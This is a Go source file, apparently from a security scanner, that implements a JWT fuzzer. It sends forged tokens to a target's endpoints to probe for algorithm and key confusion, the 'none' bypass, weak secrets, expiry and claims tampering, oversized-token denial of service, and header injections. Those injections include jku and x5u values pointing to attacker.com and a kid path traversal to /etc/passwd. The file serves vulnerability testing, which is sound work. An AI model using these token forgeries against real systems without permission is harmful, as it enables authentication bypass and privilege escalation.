package jwt

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"maps"
	"strings"
	"time"
)

// executeJWTAttacks performs various JWT-specific attacks
func (jf *JWTFuzzer) executeJWTAttacks(ctx context.Context, tokens []string) error {
	if len(tokens) == 0 {
		return nil // No tokens to test
	}

	for _, token := range tokens {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// Test algorithm confusion attacks
		if jf.config.TestAlgConfusion {
			jf.testAlgorithmConfusion(ctx, token)
			jf.testKeyConfusion(ctx, token)
			jf.testHeaderManipulation(ctx, token)
			jf.testClaimsManipulation(ctx, token)
		}

		// Test "none" algorithm bypass
		if jf.config.TestAlgNone {
			jf.testNoneAlgorithmBypass(ctx, token)
		}

		// Test weak secrets
		if jf.config.TestWeakSecrets {
			jf.testWeakSecrets(ctx, token)
			jf.testJWTBombing(ctx, token)
		}

		// Test expiration bypass
		if jf.config.TestExpiration {
			jf.testExpirationBypass(ctx, token)
		}
	}

	return nil
}

// testAlgorithmConfusion tests for algorithm confusion vulnerabilities
func (jf *JWTFuzzer) testAlgorithmConfusion(ctx context.Context, originalToken string) {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return
	}

	// Decode header
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return
	}

	// Test algorithm confusion: Change RS256 to HS256
	if alg, ok := header["alg"].(string); ok && strings.HasPrefix(alg, "RS") {
		header["alg"] = "HS256"

		newHeaderBytes, _ := json.Marshal(header)
		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderBytes)

		// Create malicious token
		maliciousToken := newHeader + "." + parts[1] + ".fake_signature"

		// Test malicious token
		if jf.testTokenValidation(ctx, maliciousToken) {
			vuln := JWTVulnerability{
				Type:           "algorithm_confusion",
				Severity:       "critical",
				Description:    "JWT algorithm confusion vulnerability (RS256 to HS256)",
				Evidence:       "Token with modified algorithm was accepted",
				Remediation:    "Strictly validate JWT algorithm in token verification",
				RiskScore:      95,
				OriginalToken:  originalToken,
				MaliciousToken: maliciousToken,
				AttackVector:   "Algorithm confusion (RS256 → HS256)",
			}
			jf.recordVulnerability(vuln)
		}
	}
}

// testNoneAlgorithmBypass tests for "none" algorithm bypass
func (jf *JWTFuzzer) testNoneAlgorithmBypass(ctx context.Context, originalToken string) {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return
	}

	// Create header with "none" algorithm
	noneHeader := map[string]interface{}{
		"alg": "none",
		"typ": "JWT",
	}

	headerBytes, _ := json.Marshal(noneHeader)
	newHeader := base64.RawURLEncoding.EncodeToString(headerBytes)

	// Create token without signature
	maliciousToken := newHeader + "." + parts[1] + "."

	// Test malicious token
	if jf.testTokenValidation(ctx, maliciousToken) {
		vuln := JWTVulnerability{
			Type:           "none_algorithm_bypass",
			Severity:       "critical",
			Description:    "JWT accepts tokens with 'none' algorithm",
			Evidence:       "Token with 'none' algorithm was accepted without signature",
			Remediation:    "Reject tokens with 'none' algorithm in production",
			RiskScore:      90,
			OriginalToken:  originalToken,
			MaliciousToken: maliciousToken,
			AttackVector:   "None algorithm bypass",
		}
		jf.recordVulnerability(vuln)
	}
}

// testWeakSecrets tests for weak HMAC secrets
func (jf *JWTFuzzer) testWeakSecrets(ctx context.Context, originalToken string) {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return
	}

	// Get configured weak secrets
	secrets := jf.config.WeakSecrets
	if len(secrets) == 0 {
		secrets = jf.weakSecrets
	}

	for _, secret := range secrets {
		// Try to forge token with weak secret
		maliciousToken := jf.forgeTokenWithSecret(originalToken, secret)
		if maliciousToken != "" {
			if jf.testTokenValidation(ctx, maliciousToken) {
				vuln := JWTVulnerability{
					Type:           "weak_secret",
					Severity:       "high",
					Description:    fmt.Sprintf("JWT uses weak HMAC secret: '%s'", secret),
					Evidence:       "Successfully forged token with weak secret",
					Remediation:    "Use strong, randomly generated HMAC secrets (256+ bits)",
					RiskScore:      85,
					OriginalToken:  originalToken,
					MaliciousToken: maliciousToken,
					AttackVector:   fmt.Sprintf("Weak secret brute force: '%s'", secret),
				}
				jf.recordVulnerability(vuln)
				return // Found weak secret, no need to test others
			}
		}
	}
}

// testExpirationBypass tests for expiration time bypass
func (jf *JWTFuzzer) testExpirationBypass(ctx context.Context, originalToken string) {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return
	}

	// Decode payload
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return
	}

	// Check if token has expiration
	if exp, ok := payload["exp"].(float64); ok {
		// Modify expiration to far future
		payload["exp"] = time.Now().Add(24 * time.Hour).Unix()

		newPayloadBytes, _ := json.Marshal(payload)
		newPayload := base64.RawURLEncoding.EncodeToString(newPayloadBytes)

		// Create malicious token (keeping original signature)
		maliciousToken := parts[0] + "." + newPayload + "." + parts[2]

		// Test malicious token
		if jf.testTokenValidation(ctx, maliciousToken) {
			vuln := JWTVulnerability{
				Type:           "expiration_bypass",
				Severity:       "medium",
				Description:    "JWT expiration time can be modified without invalidating token",
				Evidence:       "Token with modified expiration time was accepted",
				Remediation:    "Properly validate JWT signature after any payload modifications",
				RiskScore:      60,
				OriginalToken:  originalToken,
				MaliciousToken: maliciousToken,
				AttackVector:   fmt.Sprintf("Expiration bypass (original: %v)", time.Unix(int64(exp), 0)),
			}
			jf.recordVulnerability(vuln)
		}
	}
}

func (jf *JWTFuzzer) testTokenValidation(ctx context.Context, token string) bool {
	jf.incrementTestCount()

	// Test token against protected endpoints
	for _, endpoint := range jf.testEndpoints {
		headers := map[string]string{
			"Authorization": "Bearer " + token,
		}

		// Use Do method to pass headers
		resp, err := jf.httpClient.Do(ctx, "GET", jf.target.BaseURL+endpoint, nil, headers)
		if err != nil {
			continue
		}
		resp.Body.Close()

		// Check if token was accepted (not 401/403)
		if resp.StatusCode != 401 && resp.StatusCode != 403 {
			jf.recordSuccessfulTest()
			return true
		}
	}

	jf.recordFailedTest()
	return false
}

func (jf *JWTFuzzer) testClaimsManipulation(ctx context.Context, originalToken string) {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return
	}

	// Decode payload
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return
	}

	// Define privilege escalation payloads
	escalationTests := []struct {
		name        string
		manipulate  func(map[string]interface{})
		description string
	}{
		{
			name: "admin_role_injection",
			manipulate: func(p map[string]interface{}) {
				p["role"] = "admin"
				p["admin"] = true
				p["isAdmin"] = true
				p["permissions"] = []string{"read", "write", "admin", "delete", "*"}
			},
			description: "Role privilege escalation to admin",
		},
		{
			name: "user_id_manipulation",
			manipulate: func(p map[string]interface{}) {
				p["sub"] = "1" // Often admin user ID
				p["user_id"] = "1"
				p["userId"] = "1"
				p["id"] = "1"
			},
			description: "User ID manipulation to admin user",
		},
		{
			name: "scope_privilege_escalation",
			manipulate: func(p map[string]interface{}) {
				p["scope"] = "admin read write delete"
				p["scopes"] = []string{"admin", "read", "write", "delete", "manage"}
				p["authorities"] = []string{"ROLE_ADMIN", "ROLE_USER", "ROLE_SUPER"}
			},
			description: "OAuth scope privilege escalation",
		},
		{
			name: "group_membership_injection",
			manipulate: func(p map[string]interface{}) {
				p["groups"] = []string{"admin", "administrators", "root", "wheel"}
				p["memberOf"] = []string{"cn=admin,ou=groups", "cn=root,ou=groups"}
			},
			description: "Group membership privilege escalation",
		},
		{
			name: "custom_claims_injection",
			manipulate: func(p map[string]interface{}) {
				p["is_staff"] = true
				p["is_superuser"] = true
				p["can_admin"] = true
				p["access_level"] = "admin"
				p["privilege_level"] = 99
				p["clearance"] = "top_secret"
			},
			description: "Custom claims privilege escalation",
		},
	}

	for _, test := range escalationTests {
		select {
		case <-ctx.Done():
			return
		default:
		}

		// Create manipulated payload
		manipulatedPayload := make(map[string]interface{})
		for k, v := range payload {
			manipulatedPayload[k] = v
		}
		test.manipulate(manipulatedPayload)

		// Create new token with manipulated claims
		newPayloadBytes, _ := json.Marshal(manipulatedPayload)
		newPayload := base64.RawURLEncoding.EncodeToString(newPayloadBytes)
		maliciousToken := parts[0] + "." + newPayload + "." + parts[2]

		// Test for privilege escalation
		if jf.testPrivilegeEscalation(ctx, maliciousToken, originalToken) {
			vuln := JWTVulnerability{
				Type:           "claims_manipulation_" + test.name,
				Severity:       "critical",
				Description:    fmt.Sprintf("JWT claims manipulation: %s", test.description),
				Evidence:       "Modified claims were accepted, potential privilege escalation",
				Remediation:    "Validate JWT signature and implement proper authorization checks",
				RiskScore:      95,
				OriginalToken:  originalToken,
				MaliciousToken: maliciousToken,
				AttackVector:   fmt.Sprintf("Claims manipulation: %s", test.name),
			}
			jf.recordVulnerability(vuln)
		}
	}
}

func (jf *JWTFuzzer) testJWTBombing(ctx context.Context, originalToken string) {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return
	}

	// Create oversized payloads for DoS testing
	bombingTests := []struct {
		name        string
		size        int
		description string
	}{
		{"small_bomb", 10000, "10KB payload bombing"},
		{"medium_bomb", 100000, "100KB payload bombing"},
		{"large_bomb", 1000000, "1MB payload bombing"},
	}

	for _, test := range bombingTests {
		select {
		case <-ctx.Done():
			return
		default:
		}

		// Create massive payload
		massiveData := strings.Repeat("A", test.size)
		bombPayload := map[string]interface{}{
			"sub":        "user",
			"exp":        time.Now().Add(time.Hour).Unix(),
			"bomb_data":  massiveData,
			"huge_array": make([]string, 1000),
		}

		// Fill huge array
		for i := 0; i < 1000; i++ {
			bombPayload["huge_array"].([]string)[i] = strings.Repeat("X", 100)
		}

		bombPayloadBytes, _ := json.Marshal(bombPayload)
		bombPayloadB64 := base64.RawURLEncoding.EncodeToString(bombPayloadBytes)
		bombToken := parts[0] + "." + bombPayloadB64 + "." + parts[2]

		// Test if server handles oversized token gracefully
		startTime := time.Now()
		accepted := jf.testTokenValidation(ctx, bombToken)
		duration := time.Since(startTime)

		// Check for DoS indicators
		if duration > 5*time.Second || accepted {
			severity := "medium"
			riskScore := 60

			if duration > 10*time.Second {
				severity = "high"
				riskScore = 80
			}

			vuln := JWTVulnerability{
				Type:           "jwt_bombing_" + test.name,
				Severity:       severity,
				Description:    fmt.Sprintf("JWT bombing DoS vulnerability: %s", test.description),
				Evidence:       fmt.Sprintf("Server took %v to process %dKB token", duration, len(bombToken)/1024),
				Remediation:    "Implement JWT size limits and proper input validation",
				RiskScore:      riskScore,
				OriginalToken:  originalToken,
				MaliciousToken: "oversized_token_truncated",
				AttackVector:   fmt.Sprintf("JWT bombing: %s (response time: %v)", test.name, duration),
			}
			jf.recordVulnerability(vuln)
		}
	}
}

func (jf *JWTFuzzer) testKeyConfusion(ctx context.Context, originalToken string) {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return
	}

	// Decode header to check algorithm
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return
	}

	// Only test RS256 tokens
	if alg, ok := header["alg"].(string); !ok || !strings.HasPrefix(alg, "RS") {
		return
	}

	// Common public key patterns for key confusion
	commonPubKeys := []string{
		// Standard RSA public key beginnings
		"-----BEGIN PUBLIC KEY-----",
		"-----BEGIN RSA PUBLIC KEY-----",

		// Common test/demo public keys (often hardcoded)
		`-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4f5wg5l2hKsTeNem/V41
fGnJm6gOdrj8ym3rFkEjWT2btf+h9bJdIcZwHKAaH6G6P1fQ7WBx6JJJJJJJJJJj
-----END PUBLIC KEY-----`,

		// Simplified/demo keys
		"public_key_here",
		"rsa_public_key",
		"your_public_key",
	}

	// Change algorithm to HS256 for key confusion
	header["alg"] = "HS256"
	newHeaderBytes, _ := json.Marshal(header)
	newHeader := base64.RawURLEncoding.EncodeToString(newHeaderBytes)

	for _, pubKey := range commonPubKeys {
		select {
		case <-ctx.Done():
			return
		default:
		}

		// Try to forge token using public key as HMAC secret
		maliciousToken := jf.forgeTokenWithSecret(parts[0]+"."+parts[1], pubKey)
		if maliciousToken != "" {
			// Replace header with HS256
			maliciousToken = newHeader + "." + parts[1] + "." + strings.Split(maliciousToken, ".")[2]

			if jf.testTokenValidation(ctx, maliciousToken) {
				vuln := JWTVulnerability{
					Type:           "key_confusion_attack",
					Severity:       "critical",
					Description:    "JWT key confusion vulnerability (RS256 public key as HMAC secret)",
					Evidence:       "Successfully forged token using public key as HMAC secret",
					Remediation:    "Strictly validate algorithm and use separate keys for RSA/HMAC",
					RiskScore:      95,
					OriginalToken:  originalToken,
					MaliciousToken: maliciousToken,
					AttackVector:   "Key confusion (RS256 → HS256 with public key as secret)",
				}
				jf.recordVulnerability(vuln)
				return // Found key confusion, stop testing
			}
		}
	}
}

func (jf *JWTFuzzer) testHeaderManipulation(ctx context.Context, originalToken string) {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return
	}

	// Decode original header
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return
	}

	// Header injection attacks
	headerAttacks := []struct {
		name        string
		manipulate  func(map[string]interface{})
		description string
	}{
		{
			name: "jku_injection",
			manipulate: func(h map[string]interface{}) {
				h["jku"] = "http://attacker.com/jwks.json"
			},
			description: "JKU header injection for remote key loading",
		},
		{
			name: "jwk_injection",
			manipulate: func(h map[string]interface{}) {
				h["jwk"] = map[string]interface{}{
					"kty": "RSA",
					"use": "sig",
					"n":   "fake_modulus",
					"e":   "AQAB",
				}
			},
			description: "JWK header injection with malicious key",
		},
		{
			name: "x5u_injection",
			manipulate: func(h map[string]interface{}) {
				h["x5u"] = "http://attacker.com/cert.pem"
			},
			description: "X5U header injection for remote certificate loading",
		},
		{
			name: "kid_injection",
			manipulate: func(h map[string]interface{}) {
				h["kid"] = "../../../etc/passwd"
			},
			description: "KID header injection for path traversal",
		},
	}

	for _, attack := range headerAttacks {
		select {
		case <-ctx.Done():
			return
		default:
		}

		// Create manipulated header
		manipulatedHeader := make(map[string]any)
		maps.Copy(manipulatedHeader, header)
		attack.manipulate(manipulatedHeader)

		// Create new token with manipulated header
		newHeaderBytes, _ := json.Marshal(manipulatedHeader)
		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderBytes)
		maliciousToken := newHeader + "." + parts[1] + "." + parts[2]

		// Test malicious token
		if jf.testTokenValidation(ctx, maliciousToken) {
			vuln := JWTVulnerability{
				Type:           "header_manipulation_" + attack.name,
				Severity:       "high",
				Description:    fmt.Sprintf("JWT header manipulation: %s", attack.description),
				Evidence:       "Token with manipulated header was accepted",
				Remediation:    "Validate and whitelist JWT header parameters",
				RiskScore:      85,
				OriginalToken:  originalToken,
				MaliciousToken: maliciousToken,
				AttackVector:   fmt.Sprintf("Header manipulation: %s", attack.name),
			}
			jf.recordVulnerability(vuln)
		}
	}
}

func (jf *JWTFuzzer) testPrivilegeEscalation(ctx context.Context, maliciousToken, originalToken string) bool {
	// Test against admin/privileged endpoints
	privilegedEndpoints := []string{
		"/admin", "/admin/users", "/admin/dashboard",
		"/api/admin", "/api/admin/users", "/api/admin/config",
		"/management", "/management/users",
		"/users", "/api/users", // Often require admin access
		"/config", "/api/config", "/settings",
	}

	for _, endpoint := range privilegedEndpoints {
		headers := map[string]string{
			"Authorization": "Bearer " + maliciousToken,
		}

		resp, err := jf.httpClient.Do(ctx, "GET", jf.target.BaseURL+endpoint, nil, headers)
		if err != nil {
			continue
		}
		resp.Body.Close()

		// Check for successful access (200, 201) or interesting responses
		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			// Verify it's actually different from original token behavior
			originalHeaders := map[string]string{
				"Authorization": "Bearer " + originalToken,
			}

			originalResp, err := jf.httpClient.Do(ctx, "GET", jf.target.BaseURL+endpoint, nil, originalHeaders)
			if err == nil {
				originalResp.Body.Close()
				// If malicious token gives better access than original, it's privilege escalation
				if resp.StatusCode < originalResp.StatusCode ||
					(originalResp.StatusCode == 403 && resp.StatusCode == 200) {
					return true
				}
			} else {
				// If original token fails but malicious succeeds, it's escalation
				return true
			}
		}
	}

	return false
}
